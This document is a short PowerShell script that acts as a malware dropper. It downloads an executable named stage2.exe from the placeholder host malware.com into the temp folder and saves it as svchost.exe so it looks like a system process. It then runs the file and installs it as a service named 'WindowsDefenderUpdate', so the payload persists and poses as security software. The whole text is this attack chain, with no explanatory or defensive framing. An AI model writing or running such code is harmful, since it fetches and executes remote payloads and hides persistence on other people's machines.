
$url = "http://malware.com/stage2.exe"
$path = "$env:TEMP\svchost.exe"
Invoke-WebRequest -Uri $url -OutFile $path
Start-Process $path
New-Service -Name "WindowsDefenderUpdate" -BinaryPathName $path
